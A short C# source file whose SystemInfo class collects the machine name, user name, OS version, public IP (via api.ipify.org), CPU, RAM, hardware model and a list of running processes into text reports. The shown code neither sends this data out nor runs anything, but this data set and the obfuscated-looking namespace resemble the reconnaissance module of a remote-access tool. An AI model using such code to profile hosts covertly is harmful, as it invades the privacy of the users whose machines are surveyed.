using System;
using System.Net;
using System.Net.Sockets;
using System.Management;
using System.Diagnostics;
using System.Text;

namespace ns0
{
    internal static class SystemInfo
    {
        public static string GetIPAddress()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    return wc.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch { return "Unavailable"; }
        }

        public static string GetComputerInfo()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine(string.Format("Computer: {0}", Environment.MachineName));
            sb.AppendLine(string.Format("User: {0}", Environment.UserName));
            sb.AppendLine(string.Format("OS: {0}", Environment.OSVersion.VersionString));
            sb.AppendLine(string.Format("IP: {0}", GetIPAddress()));
            sb.AppendLine(string.Format("CPU Cores: {0}", Environment.ProcessorCount));
            sb.AppendLine(string.Format("RAM (MB): {0}", new PerformanceCounter("Memory", "Available MBytes").NextValue()));
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        sb.AppendLine(string.Format("Model: {0}", obj["Model"]));
                        sb.AppendLine(string.Format("Manufacturer: {0}", obj["Manufacturer"]));
                        break;
                    }
                }
            }
            catch { }
            return sb.ToString();
        }

        public static string GetProcessList()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== Running Processes ===");
            foreach (Process p in Process.GetProcesses())
            {
                try { sb.AppendLine(string.Format("{0} {1}", p.Id, p.ProcessName)); }
                catch { }
            }
            return sb.ToString();
        }
    }
}